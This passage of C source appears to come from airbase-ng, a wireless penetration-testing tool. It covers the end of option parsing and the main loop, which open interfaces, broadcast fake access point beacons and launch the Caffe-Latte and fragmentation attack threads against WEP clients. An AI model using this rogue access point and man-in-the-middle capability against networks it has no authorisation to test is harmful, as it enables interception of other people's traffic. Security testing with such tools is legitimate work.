					if (i >= 64) break;

					s += 2;

					if (s[0] == ':' || s[0] == '-') s++;

					if (s[0] == '\0' || s[1] == '\0') break;

					buf[0] = s[0];
					buf[1] = s[1];
				}

				if (i != 5 && i != 13 && i != 16 && i != 29 && i != 61)
				{
					printf("Invalid WEP key length.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				opt.weplen = (size_t) i;

				break;

			case 'F':

				if (lopt.dump_prefix != NULL)
				{
					printf("Notice: dump prefix already given\n");
					break;
				}
				/* Write prefix */
				lopt.dump_prefix = optarg;
				lopt.record_data = 1;
				break;

			case 'd':

				if (getmac(optarg, 1, mac) == 0)
				{
					addMAC(rClient, mac);
				}
				else
				{
					printf("Invalid source MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				if (lopt.filter == -1) lopt.filter = ALLOW_MACS;

				break;

			case 'D':

				if (addMACfile(rClient, optarg) != 0) return (EXIT_FAILURE);

				if (lopt.filter == -1) lopt.filter = ALLOW_MACS;

				break;

			case 'b':

				if (getmac(optarg, 1, mac) == 0)
				{
					addMAC(rBSSID, mac);
				}
				else
				{
					printf("Invalid BSSID address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}

				if (lopt.filter == -1) lopt.filter = ALLOW_MACS;

				break;

			case 'B':

				if (addMACfile(rBSSID, optarg) != 0) return (EXIT_FAILURE);

				if (lopt.filter == -1) lopt.filter = ALLOW_MACS;

				break;

			case 'r':

				if (opt.s_face != NULL || opt.s_file)
				{
					printf("Packet source already specified.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return (EXIT_FAILURE);
				}
				opt.s_file = optarg;
				break;

			case 'H':

				printf(usage,
					   getVersion("Airbase-ng",
								  _MAJ,
								  _MIN,
								  _SUB_MIN,
								  _REVISION,
								  _BETA,
								  _RC));
				return (EXIT_FAILURE);

			default:
				goto usage;
		}
	}

	if (argc - optind != 1)
	{
		if (argc == 1)
		{
		usage:
			printf(
				usage,
				getVersion(
					"Airbase-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC));
		}
		if (argc - optind == 0)
		{
			printf("No replay interface specified.\n");
		}
		if (argc > 1)
		{
			printf("\"%s --help\" for help.\n", argv[0]);
		}
		return (EXIT_FAILURE);
	}

	if ((memcmp(opt.f_netmask, NULL_MAC, 6) != 0)
		&& (memcmp(opt.f_bssid, NULL_MAC, 6) == 0))
	{
		printf("Notice: specify bssid \"--bssid\" with \"--netmask\"\n");
		printf("\"%s --help\" for help.\n", argv[0]);
		return (EXIT_FAILURE);
	}

	if (lopt.mitm && (getMACcount(rBSSID) != 1 || getMACcount(rClient) < 1))
	{
		printf("Notice: You need to specify exactly one BSSID (-b)"
			   " and at least one client MAC (-d)\n");
		printf("\"%s --help\" for help.\n", argv[0]);
		return (EXIT_FAILURE);
	}

	if (lopt.wpa1type && lopt.wpa2type)
	{
		printf("Notice: You can only set one method: WPA (-z) or WPA2 (-Z)\n");
		printf("\"%s --help\" for help.\n", argv[0]);
		return (EXIT_FAILURE);
	}

	if (lopt.allwpa && (lopt.wpa1type || lopt.wpa2type))
	{
		printf("Notice: You cannot use all WPA tags (-0)"
			   " together with WPA (-z) or WPA2 (-Z)\n");
		printf("\"%s --help\" for help.\n", argv[0]);
		return (EXIT_FAILURE);
	}

	dev.fd_rtc = -1;

/* open the RTC device if necessary */

#if defined(__i386__)
#if defined(linux)
	if (1)
	{
		if ((dev.fd_rtc = open("/dev/rtc0", O_RDONLY)) < 0)
		{
			dev.fd_rtc = 0;
		}

		if ((dev.fd_rtc == 0) && (dev.fd_rtc = open("/dev/rtc", O_RDONLY)) < 0)
		{
			dev.fd_rtc = 0;
		}

		if (dev.fd_rtc > 0)
		{
			if (ioctl(dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION) < 0)
			{
				perror("ioctl(RTC_IRQP_SET) failed");
				printf("Make sure enhanced rtc device support is enabled in "
					   "the kernel (module\n"
					   "rtc, not genrtc) - also try 'echo 1024 "
					   ">/proc/sys/dev/rtc/max-user-freq'.\n");
				close(dev.fd_rtc);
				dev.fd_rtc = -1;
			}
			else
			{
				if (ioctl(dev.fd_rtc, RTC_PIE_ON, 0) < 0)
				{
					perror("ioctl(RTC_PIE_ON) failed");
					close(dev.fd_rtc);
					dev.fd_rtc = -1;
				}
			}
		}
		else
		{
			printf("For information, no action required:"
				   " Using gettimeofday() instead of /dev/rtc\n");
			dev.fd_rtc = -1;
		}
	}
#endif /* linux */
#endif /* __i386__ */

	/* open the replay interface */
	tempstr = strdup(argv[optind]);
	if (!tempstr)
	{
		return (EXIT_FAILURE);
	}
	_wi_out = wi_open(tempstr);
	free(tempstr);
	if (!_wi_out) return (EXIT_FAILURE);
	dev.fd_out = wi_fd(_wi_out);

	/* open the packet source */
	if (opt.s_face != NULL)
	{
		_wi_in = wi_open(opt.s_face);
		if (!_wi_in) return (EXIT_FAILURE);
		dev.fd_in = wi_fd(_wi_in);
	}
	else
	{
		_wi_in = _wi_out;
		dev.fd_in = dev.fd_out;
	}

	/* drop privileges */
	if (setuid(getuid()) == -1)
	{
		perror("setuid");
	}

	/* XXX */
	if (opt.r_nbpps == 0)
	{
		if (dev.is_wlanng || dev.is_hostap)
			opt.r_nbpps = 200;
		else
			opt.r_nbpps = 500;
	}

	if (lopt.record_data)
		if (dump_initialize(lopt.dump_prefix)) return (EXIT_FAILURE);

	if (opt.s_file != NULL)
	{
		if (!(dev.f_cap_in = fopen(opt.s_file, "rb")))
		{
			perror("open failed");
			return (EXIT_FAILURE);
		}

		n = sizeof(struct pcap_file_header);

		if (fread(&dev.pfh_in, 1, n, dev.f_cap_in) != (size_t) n)
		{
			perror("fread(pcap file header) failed");
			return (EXIT_FAILURE);
		}

		if (dev.pfh_in.magic != TCPDUMP_MAGIC
			&& dev.pfh_in.magic != TCPDUMP_CIGAM)
		{
			fprintf(stderr,
					"\"%s\" isn't a pcap file (expected "
					"TCPDUMP_MAGIC).\n",
					opt.s_file);
			return (EXIT_FAILURE);
		}

		if (dev.pfh_in.magic == TCPDUMP_CIGAM) SWAP32(dev.pfh_in.linktype);

		if (dev.pfh_in.linktype != LINKTYPE_IEEE802_11
			&& dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER
			&& dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR
			&& dev.pfh_in.linktype != LINKTYPE_PPI_HDR)
		{
			fprintf(stderr,
					"Wrong linktype from pcap file header "
					"(expected LINKTYPE_IEEE802_11) -\n"
					"this doesn't look like a regular 802.11 "
					"capture.\n");
			return (EXIT_FAILURE);
		}
	}

	dev.dv_ti = ti_open(NULL);
	if (!dev.dv_ti)
	{
		printf("error opening tap device: %s\n", strerror(errno));
		return (EXIT_FAILURE);
	}

	if (!opt.quiet)
	{
		PCT;
		printf("Created tap interface %s\n", ti_name(dev.dv_ti));
	}

	// Set MTU on tun/tap interface to a preferred value
	if (!opt.quiet)
	{
		PCT;
		printf(
			"Trying to set MTU on %s to %i\n", ti_name(dev.dv_ti), lopt.ti_mtu);
	}
	if (ti_set_mtu(dev.dv_ti, lopt.ti_mtu) != 0)
	{
		if (!opt.quiet)
		{
			printf("error setting MTU on %s\n", ti_name(dev.dv_ti));
		}
		lopt.ti_mtu = ti_get_mtu(dev.dv_ti);
		if (!opt.quiet)
		{
			PCT;
			printf(
				"MTU on %s remains at %i\n", ti_name(dev.dv_ti), lopt.ti_mtu);
		}
	}

	// Set MTU on wireless interface to a preferred value
	if (wi_get_mtu(_wi_out) < lopt.wif_mtu)
	{
		if (!opt.quiet)
		{
			PCT;
			printf("Trying to set MTU on %s to %i\n",
				   _wi_out->wi_interface,
				   lopt.wif_mtu);
		}
		if (wi_set_mtu(_wi_out, lopt.wif_mtu) != 0)
		{
			lopt.wif_mtu = wi_get_mtu(_wi_out);
			if (!opt.quiet)
			{
				printf("error setting MTU on %s\n", _wi_out->wi_interface);
				PCT;
				printf("MTU on %s remains at %i\n",
					   _wi_out->wi_interface,
					   lopt.wif_mtu);
			}
		}
	}

	if (lopt.external)
	{
		dev.dv_ti2 = ti_open(NULL);
		if (!dev.dv_ti2)
		{
			printf("error opening tap device: %s\n", strerror(errno));
			return (EXIT_FAILURE);
		}
		if (!opt.quiet)
		{
			PCT;
			printf("Created tap interface %s for external processing.\n",
				   ti_name(dev.dv_ti2));
			printf("You need to get the interfaces up, read the fames "
				   "[,modify]\n");
			printf("and send them back through the same interface \"%s\".\n",
				   ti_name(dev.dv_ti2));
		}
	}

	if (lopt.channel > 0) wi_set_channel(_wi_out, lopt.channel);

	if (memcmp(opt.r_bssid, NULL_MAC, 6) == 0 && !lopt.adhoc)
	{
		wi_get_mac(_wi_out, opt.r_bssid);
	}

	if (memcmp(opt.r_smac, NULL_MAC, 6) == 0)
	{
		wi_get_mac(_wi_out, opt.r_smac);
	}

	if (lopt.adhoc)
	{
		for (i = 0; i < 6; i++) // random cell
			opt.r_bssid[i] = rand_u8();

		// generate an even first byte
		if (opt.r_bssid[0] & 0x01) opt.r_bssid[0] ^= 0x01;
	}

	memcpy(apc.bssid, opt.r_bssid, 6);
	if (getESSIDcount() == 1 && lopt.hidden != 1)
	{
		apc.essid = (char *) malloc(MAX_IE_ELEMENT_SIZE + 1);
		ALLEGE(apc.essid != NULL);
		apc.essid_len = getESSID(apc.essid);
		apc.essid = (char *) realloc((void *) apc.essid, apc.essid_len + 1u);
		ALLEGE(apc.essid != NULL);
		apc.essid[apc.essid_len] = 0x00;
	}
	else
	{
		apc.essid = "\x00";
		apc.essid_len = 1;
	}
	apc.interval = lopt.interval;
	apc.capa[0] = 0x00;
	if (lopt.adhoc)
		apc.capa[0] |= 0x02;
	else
		apc.capa[0] |= 0x01;
	if ((opt.crypt == CRYPT_WEP && lopt.setWEP == -1) || lopt.setWEP == 1)
		apc.capa[0] |= 0x10;
	apc.capa[1] = 0x04;

	if (ti_set_mac(dev.dv_ti, opt.r_bssid) != 0)
	{
		printf("\n");
		perror("ti_set_mac failed");
		printf(
			"You most probably want to set the MAC of your TAP interface.\n");
		printf("ifconfig <iface> hw ether %02X:%02X:%02X:%02X:%02X:%02X\n\n\n",
			   opt.r_bssid[0],
			   opt.r_bssid[1],
			   opt.r_bssid[2],
			   opt.r_bssid[3],
			   opt.r_bssid[4],
			   opt.r_bssid[5]);
	}

	if (lopt.external)
	{
		if (ti_set_mac(dev.dv_ti2, (unsigned char *) "\xba\x98\x76\x54\x32\x10")
			!= 0)
		{
			printf("Couldn't set MAC on interface \"%s\".\n",
				   ti_name(dev.dv_ti2));
		}
	}
	// start sending beacons
	if (pthread_create(&(beaconpid), NULL, &beacon_thread, (void *) &apc) != 0)
	{
		perror("Beacons pthread_create");
		return (EXIT_FAILURE);
	}

	if (lopt.caffelatte)
	{
		arp = (struct ARP_req *) malloc(opt.ringbuffer
										* sizeof(struct ARP_req));
		ALLEGE(arp != NULL);

		if (pthread_create(&(caffelattepid), NULL, &caffelatte_thread, NULL)
			!= 0)
		{
			perror("Caffe-Latte pthread_create");
			return (EXIT_FAILURE);
		}
	}

	if (lopt.cf_attack)
	{
		if (pthread_create(&(cfragpid), NULL, &cfrag_thread, NULL) != 0)
		{
			perror("cfrag pthread_create");
			return (EXIT_FAILURE);
		}
	}

	if (!opt.quiet)
	{
		if (lopt.adhoc)
		{
			PCT;
			printf("Sending beacons in Ad-Hoc mode for Cell "
				   "%02X:%02X:%02X:%02X:%02X:%02X.\n",
				   opt.r_bssid[0],
				   opt.r_bssid[1],
				   opt.r_bssid[2],
				   opt.r_bssid[3],
				   opt.r_bssid[4],
				   opt.r_bssid[5]);
		}
		else
		{
			PCT;
			printf("Access Point with BSSID %02X:%02X:%02X:%02X:%02X:%02X "
				   "started.\n",
				   opt.r_bssid[0],
				   opt.r_bssid[1],
				   opt.r_bssid[2],
				   opt.r_bssid[3],
				   opt.r_bssid[4],
				   opt.r_bssid[5]);
		}
	}

	for (;;)
	{
		if (opt.s_file != NULL)
		{
			n = sizeof(pkh);

			if (fread(&pkh, n, 1, dev.f_cap_in) != 1)
			{
				PCT;
				printf("Finished reading input file %s.\n", opt.s_file);
				opt.s_file = NULL;
				continue;
			}

			if (dev.pfh_in.magic == TCPDUMP_CIGAM)
			{
				SWAP32(pkh.caplen);
				SWAP32(pkh.len);
			}

			n = caplen = pkh.caplen;

			if (n <= 0 || n > (int) sizeof(h80211))
			{
				PCT;
				printf("Finished reading input file %s.\n", opt.s_file);
				opt.s_file = NULL;
				continue;
			}

			if (fread(h80211, n, 1, dev.f_cap_in) != 1)
			{
				PCT;
				printf("Finished reading input file %s.\n", opt.s_file);
				opt.s_file = NULL;
				continue;
			}

			if (dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER)
			{
				if (h80211[7] == 0x40)
					n = 64;
				else
					n = *(int *) (h80211 + 4); //-V1032

				if (n < 8 || n >= (int) caplen) continue;

				memcpy(tmpbuf, h80211, caplen);
				caplen -= n;
				memcpy(h80211, tmpbuf + n, caplen);
			}

			if (dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR)
			{
				/* remove the radiotap header */

				n = *(unsigned short *) (h80211 + 2);

				if (n <= 0 || n >= (int) caplen) continue;

				memcpy(tmpbuf, h80211, caplen);
				caplen -= n;
				memcpy(h80211, tmpbuf + n, caplen);
			}

			if (dev.pfh_in.linktype == LINKTYPE_PPI_HDR)
			{
				/* remove the PPI header */

				n = le16_to_cpu(*(unsigned short *) (h80211 + 2));

				if (n <= 0 || n >= (int) caplen) continue;

				/* for a while Kismet logged broken PPI headers */
				if (n == 24
					&& le16_to_cpu(*(unsigned short *) (h80211 + 8)) == 2)
					n = 32;

				if (n <= 0 || n >= (int) caplen) continue; //-V560

				memcpy(tmpbuf, h80211, caplen);
				caplen -= n;
				memcpy(h80211, tmpbuf + n, caplen);
			}

			packet_recv(h80211, caplen, &apc, (lopt.external & EXT_IN));
			msleep(1000 / opt.r_nbpps);
			continue;
		}

		FD_ZERO(&read_fds);
		FD_SET(dev.fd_in, &read_fds);
		FD_SET(ti_fd(dev.dv_ti), &read_fds);
		if (lopt.external)
		{
			FD_SET(ti_fd(dev.dv_ti2), &read_fds);
			ret_val = select(
				MAX(ti_fd(dev.dv_ti), MAX(ti_fd(dev.dv_ti2), dev.fd_in)) + 1,
				&read_fds,
				NULL,
				NULL,
				NULL);
		}
		else
			ret_val = select(MAX(ti_fd(dev.dv_ti), dev.fd_in) + 1,
							 &read_fds,
							 NULL,
							 NULL,
							 NULL);
		if (ret_val < 0) break;
		if (ret_val > 0)
		{
			if (FD_ISSET(ti_fd(dev.dv_ti), &read_fds))
			{
				len = ti_read(dev.dv_ti, buffer, sizeof(buffer));
				if (len > 0)
				{
					packet_xmit(buffer, len);
				}
			}
			if (lopt.external && FD_ISSET(ti_fd(dev.dv_ti2), &read_fds))
			{
				len = ti_read(dev.dv_ti2, buffer, sizeof(buffer));
				if (len > 0)
				{
					packet_xmit_external(buffer, len, &apc);
				}
			}
			if (FD_ISSET(dev.fd_in, &read_fds))
			{
				len = read_packet(_wi_in, buffer, sizeof(buffer), NULL);
				if (len > 0)
				{
					packet_recv(buffer, len, &apc, (lopt.external & EXT_IN));
				}
			}
		} // if( ret_val > 0 )
	} // for( ; ; )

	ti_close(dev.dv_ti);

	/* that's all, folks */

	return (EXIT_SUCCESS);
}
